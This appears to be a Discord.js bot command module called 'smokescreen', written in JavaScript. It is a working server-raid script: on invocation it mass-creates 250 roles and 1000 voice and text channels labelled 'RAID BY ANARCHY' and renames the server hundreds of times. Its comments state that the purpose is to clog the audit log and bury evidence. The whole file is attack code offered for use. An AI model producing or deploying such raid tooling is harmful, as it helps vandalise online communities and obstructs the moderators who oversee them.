const Discord = require('discord.js');

  const ms = require('ms');
  exports.run = (client, message, args) => {

            for (var i = 0; i < 250; i++) {
                // Creates new roles to clog up the audit log
                message.guild.createRole({
                    name: 'ANARCHY',
                    color: 'RED',
                });
              }
                for (var i = 0; i < 500; i++) {
                message.guild.createChannel('RAID BY ANARCHY', 'voice')
                message.guild.createChannel('RAID BY ANARCHY', 'text')
                //changes name tons of times to clog up the audit log
                message.guild.setName("RAID BY ANARCHY");
                }
            };



    exports.conf = {
        enabled: true,
        guildOnly: false,
        aliases: [],
        permLevel: 0
      };

      exports.help = {
        name: 'smokescreen',
        description: '',
        usage: ''
      };
